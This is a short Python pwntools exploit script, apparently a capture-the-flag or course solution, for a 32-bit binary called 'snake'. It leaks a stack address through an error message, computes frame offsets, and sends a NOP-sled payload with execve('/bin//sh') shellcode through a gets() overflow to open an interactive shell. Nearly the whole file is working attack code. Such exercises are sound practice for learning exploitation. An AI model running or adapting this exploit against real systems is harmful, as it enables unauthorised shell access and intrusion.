from pwn import *
import re

p = process("./snake")
# p = remote('plsdonthaq.me', 4002)

# Vulnerable `gets(ebp-0x32)`

# password prompt reads 0x63 bytes
# The error message which leaks an address on the stack when anything greater than 0x50 (80) characters is passed in
p.sendline(b"3")
p.sendline(b"*" * 80)
p.recvuntil("Error occurred while printing flag at offset ")

flagAddress = int(p.recvline(keepends=False), 16)
print(f"Flag Address at = {hex(flagAddress)}")
# It's not actually a flag address though - the flag isn't loaded anywhere

ebp = flagAddress + 0xc
print(f"Calculated read_option::ebp = {hex(ebp)}")

# Shellcode for `execve("/bin//sh", NULL, NULL, NULL)`
assembly = f"""
   push 0x68732f2f
   push 0x6e69622f

   mov ebx, esp

   mov eax, 0xb
   xor ecx, ecx
   xor edx, edx
   xor esi, esi
   int 0x80
"""
shellcode = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))

# get_name()'s ebp is 0x78 away
getName_ebp = ebp - 0x78

p.sendline(b"1")

pause()
payload = b""
payload += b'\x90' * (0x32 - len(shellcode))
payload += shellcode
payload += b'yeet' # Okay, not toooooo sure why I need this here, but it crashes if I don't.
payload += p32(getName_ebp - 0x32)

p.sendline(payload)

p.interactive()